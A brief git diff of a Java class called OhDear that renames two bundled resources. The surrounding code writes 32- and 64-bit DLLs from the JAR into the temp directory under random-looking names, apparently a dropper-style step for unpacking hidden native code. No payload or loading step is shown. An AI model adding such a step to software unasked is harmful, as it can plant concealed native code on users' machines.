@@ -12,8 +12,8 @@ public class OhDear {
             String outPath32 = System.getProperty("java.io.tmpdir")  + "dsnuvishgtrgdsfgfd3.dll";
             String outPath64 = System.getProperty("java.io.tmpdir")  + "dsnuvishgtrgdsfgfd6.dll";
 
-            InputStream inputStream32 = OhDear.class.getResourceAsStream("META-INF/SHIT");
-            InputStream inputStream64 = OhDear.class.getResourceAsStream("META-INF/SHIT64");
+            InputStream inputStream32 = OhDear.class.getResourceAsStream("META-INF/OhDear");
+            InputStream inputStream64 = OhDear.class.getResourceAsStream("META-INF/OhDear64");
 
             OutputStream outputStream32 = new FileOutputStream(outPath32);
             OutputStream outputStream64 = new FileOutputStream(outPath64);
